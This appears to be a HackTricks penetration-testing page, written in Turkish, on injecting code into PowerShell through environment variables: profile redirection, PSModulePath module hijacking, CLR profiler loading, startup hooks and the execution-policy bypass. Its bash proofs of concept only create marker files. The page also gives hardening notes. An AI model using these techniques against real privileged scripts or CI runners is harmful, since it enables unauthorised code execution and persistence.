# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

PowerShell platformlar arasıdır: aynı `pwsh` binary'si macOS, Linux ve Windows üzerinde çalışır ve bir **.NET (Core) application**'dır. Bu durum, bir `pwsh` çağrısının ortamını kontrol eden saldırgana, üç işletim sisteminin tümünde aynı şekilde çalışan çeşitli environment-variable → code-execution primitive'leri ve ayrıca yalnızca Windows'a özgü birkaç primitive sağlar. Bunların tamamı, kurbanın çalıştırmayı amaçladığı `-Command`/`-File` seçeneğinden **önce** (veya onun yerine) çalışır; bu da onları inherited environment ile `pwsh` çalıştıran privileged wrapper'lara, cron/`launchd`/systemd job'larına ve CI runner'larına karşı ideal hâle getirir.

## `XDG_CONFIG_HOME` and PowerShell profiles

macOS ve Linux'ta PowerShell, XDG configuration path'lerini kullanır ve `pwsh` başlatıldığında user profile script'lerini çalıştırır. `XDG_CONFIG_HOME`'u yönlendirmek, `powershell/profile.ps1` ile console-host-specific `powershell/Microsoft.PowerShell_profile.ps1` dosyalarını içeren directory'yi değiştirir; dolayısıyla burada kontrol edilen bir dosya, `-Command` payload'undan önce çalışabilir.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Bu, Windows dışı platformlarda PowerShell 6+ (`pwsh`) için geçerlidir; Windows PowerShell farklı profile konumları kullanır. `pwsh -NoProfile`, profile yüklenmesini engeller. Ayrıca diğer PowerShell host'larının farklı script'ler seçebilmesi nedeniyle `HOME` ve host'a özgü profile adlarını da inceleyin.

> [!TIP]
> **Windows** üzerinde profile yolları `$HOME` / *Documents* known folder'dan türetilir (örneğin `pwsh` için `Documents\PowerShell\Microsoft.PowerShell_profile.ps1`, Windows PowerShell için `Documents\WindowsPowerShell\...`); bu nedenle `HOME`/`USERPROFILE` değerlerini etkilemek veya yalnızca bu dosyaya yazmak eşdeğer primitive'dir.

## `PSModulePath` module auto-loading hijack

PowerShell 3.0'dan beri **module auto-loading**, dışa aktardığı bir komuta ilk kez başvurulduğunda (çalıştırıldığında, `Get-Command` ile sorgulandığında veya tab-completion sırasında) modülü otomatik olarak içe aktarır. PowerShell, `.psd1`/`.psm1` dosyaları için **`$Env:PSModulePath`** içinde listelenen her dizini recursive olarak arar ve Windows dışı platformlarda process'ten devralınan `PSModulePath` olduğu gibi dikkate alınır. Bu nedenle **`PSModulePath` değerine bir dizini başa ekleyebilirseniz**, kurban script'inin çağırdığı bir komutla veya script'in `Import-Module` ile içe aktardığı bir module adıyla eşleşen bir module yerleştirebilirsiniz; böylece module-scope kodunuz import sırasında çalışır.<sup>[[3]](#references)</sup>

PowerShell komut çözümlemesi *Alias → Function → Cmdlet → Application* sırasını izlediğinden, **module'ünüz tarafından dışa aktarılan bir function hedefin kullandığı yerleşik bir cmdlet'i shadow edebilir** (ör. `Get-ChildItem`); bu nedenle kurbanın herhangi bir şeyi adla içe aktarmasına bile gerek kalmaz.
```bash
# Attacker-controlled module dir prepended to PSModulePath
mkdir -p /tmp/evil/Hijack
cat >/tmp/evil/Hijack/Hijack.psm1 <<'PS1'
# Top-level module code runs at import time
New-Item -ItemType File -Path /tmp/psmodulepath-executed -Force | Out-Null
function Invoke-Report { 'hijacked' }   # shadows whatever the victim calls
Export-ModuleMember -Function Invoke-Report
PS1
cat >/tmp/evil/Hijack/Hijack.psd1 <<'PS1'
@{ ModuleVersion = '1.0'; RootModule = 'Hijack.psm1'; FunctionsToExport = @('Invoke-Report') }
PS1

# Victim runs pwsh with an inherited/attacker-influenced PSModulePath and calls Invoke-Report
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/psmodulepath-executed && echo 'PSModulePath auto-load executed'
```
**Windows** üzerinde de aynı durum geçerlidir (`;` ile ayrılmış yollar); `PSModulePath` ayrıca `HKCU:\Environment` ve `HKLM:\...\Session Manager\Environment` değerlerinden beslenir, bu nedenle yazılabilir bir kullanıcı kapsamı değeri de bir persistence primitive'dir. Otomatik yükleme `$PSModuleAutoloadingPreference = 'None'` ile devre dışı bırakılabilir; `pwsh -NoProfile` ise bunu durdurmaz.

## CLR profiler injection (`CORECLR_PROFILER` / `COR_PROFILER`)

`pwsh`, .NET Core üzerinde çalışır; bu nedenle **CLR profiling API**, yalnızca ortam değişkenleri aracılığıyla başlangıçta saldırgana ait bir DLL/`.so`/`.dylib` dosyasını sürece yükler — imza gerekmez ve `*_PATH` değişkenleri registry'ye göre öncelikli olduğundan COM registration da gerekmez. Profiler library'sinin `DllMain`/entry point'i PowerShell sürecinin içinde çalışır; bu, klasik bir in-process code-execution ve persistence tekniğidir (MITRE ATT&CK **T1574.012**).<sup>[[4]](#references)</sup>
```bash
# .NET Core / .NET 5+ (pwsh) — cross-platform. Use .so on Linux, .dylib on macOS, .dll on Windows.
CORECLR_ENABLE_PROFILING=1 \
CORECLR_PROFILER='{cf0d821e-299b-5307-a3d8-b283c03916db}' \
CORECLR_PROFILER_PATH=/tmp/evil_profiler.so \
pwsh -Command '$true'
```
- **.NET 8+** üzerinde değişkenler daha yeni `DOTNET_` önekini de kullanabilir (`DOTNET_EnableDiagnostics=1`, `DOTNET_ENABLE_PROFILING=1`, `DOTNET_PROFILER`, `DOTNET_PROFILER_PATH`); `CORECLR_*` geriye dönük uyumluluk için korunmuştur.
- **Windows PowerShell 5.1** (`powershell.exe`, .NET Framework) için eşdeğer üçlü **`COR_ENABLE_PROFILING=1`**, **`COR_PROFILER={CLSID}`** ve **`COR_PROFILER_PATH=C:\evil.dll`** şeklindedir.

Profiler DLL'inin yalnızca geçerli bir COM/ICorProfilerCallback kütüphanesi olması (veya işini doğrudan `DllMain` içinden yapması) yeterlidir. Defensive launcher'lar ayrıcalıklı ortamlardan `COR_*`/`CORECLR_*`/`DOTNET_*` değişkenlerini kaldırmalıdır.

## `DOTNET_STARTUP_HOOKS` (önce-`Main` .NET hook'u)

`pwsh` bir .NET Core uygulaması olduğundan, **`DOTNET_STARTUP_HOOKS`**, host'un `Main`'inden önce, yani PowerShell'in kendisi başlamadan önce, `StartupHook.Initialize()` yönteminin senkron olarak çalıştığı bir managed assembly'yi gösterir. Bu, en temiz managed-code primitive'idir ve diğer tüm .NET uygulamalarıyla paylaşılır:

{{#ref}}
macos-.net-applications-injection.md
{{#endref}}

## `PSExecutionPolicyPreference` (Windows control bypass)

Windows'ta **`$Env:PSExecutionPolicyPreference`** ortam değişkeninin ayarlanması (örneğin `Bypass` veya `Unrestricted` olarak), ilgili process için geçerli Execution Policy'yi geçersiz kılar — bu, tam olarak `Set-ExecutionPolicy -Scope Process` komutunun yazdığı değerdir. Tek başına code execution sağlamaz; ancak "unsigned scripts are blocked" güvenlik önlemini kaldırır ve yukarıdaki primitive'lerden birinin (yerleştirilmiş bir profile / module) gerçekten çalışmasını sağlamak için çoğu zaman eksik olan bağlantıyı oluşturur. Execution Policy yalnızca Windows'a özgüdür ve hiçbir zaman bir security boundary olmamıştır.<sup>[[5]](#references)</sup>

## References

- [1] [PowerShell ortam değişkenleri ve XDG yolları](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell profilleri](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
- [3] [`about_PSModulePath` ve module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [4] [.NET debugging ve profiling yapılandırma ayarları (CORECLR_/DOTNET_ profiler değişkenleri)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
- [5] [`about_Execution_Policies` (PSExecutionPolicyPreference) hakkında](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
{{#include ../../../banners/hacktricks-training.md}}
